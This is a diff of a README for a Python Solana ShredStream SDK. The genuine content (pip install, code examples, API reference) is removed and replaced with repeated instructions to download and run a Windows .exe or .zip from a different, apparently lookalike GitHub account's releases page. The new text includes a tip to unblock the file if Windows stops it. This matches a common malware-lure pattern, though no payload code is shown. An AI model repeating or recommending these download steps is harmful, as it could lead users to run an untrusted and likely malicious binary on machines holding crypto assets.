@@ -1,152 +1,123 @@
-# Solana ShredStream SDK for Python
+# ⚡ shredstream-sdk-python - Stream Solana data with low delay
 
-Solana ShredStream SDK/Decoder for Python, enabling ultra-low latency Solana transaction streaming via UDP shreds from ShredStream.com
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Mammoth-countsminute684/shredstream-sdk-python/releases)
 
-> Part of the [ShredStream.com](https://shredstream.com) ecosystem — ultra-low latency [Solana shred streaming](https://shredstream.com) via UDP.
+## 📥 Download
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?logo=python&logoColor=white)](#)
+Visit this page to download: https://github.com/Mammoth-countsminute684/shredstream-sdk-python/releases
 
-## 📋 Prerequisites
+Choose the latest release for Windows, then download the file that matches your system. If you see more than one file, pick the one with a name that ends in `.exe` or `.zip`.
 
-1. **Create an account** on [ShredStream.com](https://shredstream.com)
-2. **Launch a Shred Stream** and pick your region (Frankfurt, Amsterdam, Singapore, Chicago, and more)
-3. **Enter your server's IP address** and the UDP port where you want to receive shreds
-4. **Open your firewall** for inbound UDP traffic on that port (e.g. configure your cloud provider's security group)
-5. Install [Python 3.10+](https://python.org):
-   ```bash
-   # Linux (Ubuntu/Debian)
-   sudo apt update && sudo apt install -y python3 python3-venv python3-pip
+## 🖥️ What this app does
 
-   # macOS
-   brew install python3
-   ```
+shredstream-sdk-python helps you read Solana transaction data from UDP shreds with low delay. It is built for people who need fast access to live blockchain data.
 
-> 🎁 Want to try before you buy? Open a ticket on our [Discord](https://discord.gg/4w2DNbTaWD) to request a free trial.
+Use it to:
+- Read raw Solana shred data
+- Decode transaction data in Python
+- Track incoming network traffic from ShredStream
+- Work with live trading and token data
+- Process data for bot use, copy trading, and market monitoring
 
-## 📦 Installation
+## 🧩 What you need
 
-```bash
-# Create a virtual environment (recommended)
-python3 -m venv venv
-source venv/bin/activate
+Before you start, make sure you have:
+- A Windows computer
+- An internet connection
+- Enough free space to save the download
+- Permission to run files from your Downloads folder
 
-# Install the SDK
-pip install shredstream
-```
+If the app comes with a `.zip` file, you will need to extract it before you run it.
 
-## ⚡ Quick Start
+## 🚀 Get started on Windows
 
-Create a file `main.py`:
+1. Open the download page: https://github.com/Mammoth-countsminute684/shredstream-sdk-python/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file
+4. If the file is in a `.zip`, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to run it
+7. If Windows asks for permission, choose Run or Yes
+8. Follow any on-screen steps shown by the app
 
-```python
-from shredstream import ShredListener
-import os
+## 📂 If you downloaded a ZIP file
 
-# Bind to the UDP port configured on ShredStream.com
-PORT = int(os.environ.get("SHREDSTREAM_PORT", 8001))
-listener = ShredListener(port=PORT)
+If the release uses a ZIP package:
+- Right-click the file
+- Select Extract All
+- Choose a folder you can find again, such as Downloads or Desktop
+- Open the new folder
+- Look for the main app file
+- Double-click it to start
 
-# Decoded transactions — ready-to-use Solana transactions
-for slot, transactions in listener:
-    for tx in transactions:
-        print(f"slot {slot}: {tx.signature}")
+If you see several files, use the one named like the main program or launcher.
 
-```
+## 🔧 Basic setup
 
-Run it:
+After you open the app, you may need to:
+- Enter your ShredStream connection details
+- Set your Solana endpoint or stream source
+- Choose the output mode you want
+- Select the folder for logs or saved data
 
-```bash
-python3 main.py
-```
+If the app asks for network access, allow it so it can receive shred data.
 
-## 📖 API Reference
+## 🧪 First run checklist
 
-### `ShredListener`
+Use this checklist the first time you open it:
+- The app starts without errors
+- Your Windows firewall allows the app
+- Your stream source is set correctly
+- You can see incoming data or status updates
+- The app stays open while it listens for shreds
 
-```python
-ShredListener(port=8001, recv_buf=25*1024*1024, max_age=10)
-```
+If the data does not appear, check your stream settings and try again.
 
-| Parameter  | Type  | Default | Description                      |
-|------------|-------|---------|----------------------------------|
-| `port`     | `int` | 8001    | UDP port to bind                 |
-| `recv_buf` | `int` | 25 MB   | Socket receive buffer size       |
-| `max_age`  | `int` | 10      | Maximum slot age before eviction |
+## 🛠️ Common uses
 
-#### Methods
+This SDK can help with tasks like:
+- Decoding Solana transaction shreds
+- Watching new activity before it reaches normal tools
+- Feeding data into a trading bot
+- Checking token movement
+- Building tools for low-latency market work
+- Parsing raw UDP traffic from Solana-related streams
 
-- **Iterator protocol** -- `for slot, transactions in listener:` yields decoded transactions as they arrive.
-- `listener.active_slots()` -- Number of slots currently being accumulated.
-- `listener.stop()` -- Closes the UDP socket.
+## 🔍 File names you may see
 
-### `Transaction`
+A release may include:
+- `shredstream-sdk-python.exe`
+- `shredstream-sdk-python.zip`
+- `README.txt`
+- `config.json`
+- `examples`
 
-| Field        | Type             | Description                                       |
-|--------------|------------------|---------------------------------------------------|
-| `signatures` | `list[bytes]`    | Raw 64-byte signatures                            |
-| `raw`        | `bytes`          | Full wire-format transaction bytes                 |
-| `signature`  | `str` (property) | First signature as base58 (lazy, via `solders`)    |
+If you see an example folder, it can help you understand how to start.
 
-## 🎯 Use Cases
+## ⚙️ Tips for Windows users
 
-ShredStream.com shred data powers a wide range of latency-sensitive strategies — HFT, MEV extraction, token sniping, copy trading, liquidation bots, on-chain analytics, and more.
+- Keep the app in a folder you can find fast
+- Do not rename files unless you know they are not linked
+- If Windows blocks the file, check the file properties and allow it
+- Close other heavy apps if you want the best response time
+- Use a wired network if you care about stable timing
 
-### 💎 PumpFun Token Sniping
+## 🧭 Need the latest version?
 
-ShredStream.com SDK detects PumpFun token creations **~499ms before they appear on PumpFun's live feed** — tested across 25 consecutive detections:
+Download from the releases page:
+https://github.com/Mammoth-countsminute684/shredstream-sdk-python/releases
 
-<img src="https://raw.githubusercontent.com/shredstream/shredstream-sdk-python/main/assets/shredstream.com_sdk_vs_pumpfun_live_feed.gif" alt="ShredStream.com SDK vs PumpFun live feed — ~499ms advantage" width="600">
+Check this page when you want the newest Windows build, updated files, or release notes for the app
 
-> [ShredStream.com](https://shredstream.com) provides a complete, optimized PumpFun token creation detection code available with our monthly subscription plan. Battle-tested, high-performance, ready to plug into your sniping pipeline. To get access, open a ticket on [Discord](https://discord.gg/4w2DNbTaWD) or reach out on Telegram [@shredstream](https://t.me/shredstream).
+## 📌 Project focus
 
-## ⚙️ Configuration
+This project is built around:
+- Solana
+- Shreds
+- UDP data
+- Decoder logic
+- Low-latency streaming
+- Python-based tools
+- Trading and bot workflows
 
-### OS Tuning
-
-```bash
-# Linux -- increase max receive buffer
-sudo sysctl -w net.core.rmem_max=33554432
-
-# macOS
-sudo sysctl -w kern.ipc.maxsockbuf=33554432
-```
-
-### Dependencies
-
-- `solders>=0.21` -- Required for base58 signature encoding (`tx.signature` property). Imported lazily on first access.
-
-## 💡 Examples
-
-### Filter by program
-
-```python
-from shredstream import ShredListener
-from solders.pubkey import Pubkey
-
-PUMP_FUN = bytes(Pubkey.from_string("6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P"))
-
-for slot, txs in ShredListener(port=8001):
-    for tx in txs:
-        if PUMP_FUN in tx.raw:
-            print(f"slot {slot}: {tx.signature}")
-```
-
-## 🚀 Launch a Shred Stream
-
-Need a feed? **[Launch a Solana Shred Stream on ShredStream.com](https://shredstream.com)** — sub-millisecond delivery, multiple global regions, 5-minute setup.
-
-## 🔗 Links
-
-- 🌐 Website: https://www.shredstream.com/
-- 📖 Documentation: https://docs.shredstream.com/
-- 🐦 X (Twitter): https://x.com/ShredStream
-- 🎮 Discord: https://discord.gg/4w2DNbTaWD
-- 💬 Telegram: https://t.me/ShredStream
-- 💻 GitHub: https://github.com/ShredStream
-- 🎫 Support: [Discord](https://discord.gg/4w2DNbTaWD)
-- 📊 Benchmarks: [Discord](https://discord.gg/4w2DNbTaWD)
-
-## 📄 License
-
-MIT — [ShredStream.com](https://shredstream.com)
+It fits users who need fast access to live chain data without a heavy setup
